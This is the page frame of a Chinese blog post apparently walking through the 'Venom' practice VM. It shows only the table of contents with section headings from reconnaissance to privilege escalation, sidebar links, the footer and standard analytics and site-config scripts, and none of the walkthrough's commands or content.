class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 一、信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%9C%B0%E5%9D%80%E7%A1%AE%E8%AE%A4"><span class="toc-number">2.1.</span> <span class="toc-text"> （1）地址确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text"> （2）端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3ftp-%E5%88%9D%E5%B0%9D%E8%AF%95-%E5%8C%BF%E5%90%8D%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text"> （3）FTP 初尝试 - 匿名测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4smb-%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text"> （4）SMB 匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#580-%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.5.</span> <span class="toc-text"> （5）80 端口渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.5.1.</span> <span class="toc-text"> ① 目录扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="toc-number">2.5.2.</span> <span class="toc-text"> ② 查看网站源码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ftp-%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8-%E5%AF%BB%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 二、FTP 深度利用 - 寻找敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E8%8E%B7%E5%8F%96%E5%88%B0%E5%85%B3%E9%94%AE-hint-%E4%BF%AE%E6%94%B9-hosts-%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text"> 三、获取到关键 hint - 修改 hosts 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E6%89%BE%E5%88%B0%E7%99%BB%E5%BD%95%E6%A1%86-%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">5.</span> <span class="toc-text"> 四、找到登录框 - 尝试登录管理员用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F-%E6%B7%B1%E5%BA%A6%E6%B5%8B%E8%AF%95"><span class="toc-number">6.</span> <span class="toc-text"> 五、后台管理员登录成功 - 深度测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9-shell-%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text"> 六、成功反弹 Shell - 进行提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E4%BA%A4%E4%BA%92%E6%80%A7"><span class="toc-number">7.1.</span> <span class="toc-text"> 提升交互性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%8F%90%E6%9D%83%E6%A3%80%E6%9F%A5"><span class="toc-number">7.2.</span> <span class="toc-text"> 常规提权检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">7.3.</span> <span class="toc-text"> 寻找敏感信息</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/2026/05/12/test-vm/" rel="bookmark" title="测试靶机 - Kioptrix Level 1">测试靶机 - Kioptrix Level 1</a></li><li  class="active"><a href="/2026/06/20/%E6%B5%8B%E8%AF%95%E9%9D%B6%E6%9C%BA-Venom/" rel="bookmark" title="测试靶机-Venom">测试靶机-Venom</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="Lib0gus的小屋" src="/assets/test.png"/><p class="name" itemprop="name">Lib0gus的小屋</p><div class="description" itemprop="description">记录学习日常，请犀利点评，指出我的错误</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">17</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">5</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/Lib0gus" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;Lib0gus"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/%E6%AD%A6%E5%99%A8%E5%BA%93/" rel="section"><i class="ic i-crosshairs"></i>武器库</a></li><li class="item"><a href="/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E7%BB%83/" rel="section"><i class="ic i-bug"></i>靶机精练</a></li><li class="item"><a href="/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="section"><i class="ic i-code"></i>Java代码审计</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/05/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Day4%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Day4%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">Day4 动态代理</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/13/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">中间件常见漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java%E5%AE%89%E5%85%A8/" title="分类于Java安全">Java安全</a></div><span><a href="/2026/03/30/Java%E5%AE%89%E5%85%A8%E4%B9%8BShiro/">Java安全之Shiro</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/01/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/">解决hexo博客图片显示问题</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/06/%E5%B8%B8%E7%94%A8webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">常用webshell工具流量分析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="分类于Java代码审计">Java代码审计</a></div><span><a href="/2026/05/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Day2%20%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/">Day2 类加载器</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="分类于Java代码审计">Java代码审计</a></div><span><a href="/2026/05/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Day1%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Day1 环境搭建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E7%BB%83/" title="分类于靶机精练">靶机精练</a></div><span><a href="/2026/06/20/%E6%B5%8B%E8%AF%95%E9%9D%B6%E6%9C%BA-Venom/">测试靶机-Venom</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="分类于Java代码审计">Java代码审计</a></div><span><a href="/2026/05/22/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Day3%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">Day3 反射机制</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/" title="分类于技术随笔">技术随笔</a></div><span><a href="/2026/03/11/hello-world/">Hello World</a></span></li></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">Lib0gus的小屋 @ Lib0gus的博客</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">99k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">1:30</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/06/20/测试靶机-Venom/`,
+    favicon: {
+        show: `（●´3｀●）やれやれだぜ`,
+        hide: `(´Д｀)大変だ！`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script>var _hmt = _hmt || [];
+(function () {
+    const hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?true"
+    hm.async = true;
+    const s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+ })();</script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=true;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "true");</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=true"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag() {
+    dataLayer.push(arguments);
+}
+gtag('js', new Date());
+gtag('config', 'true');</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script></body></html>
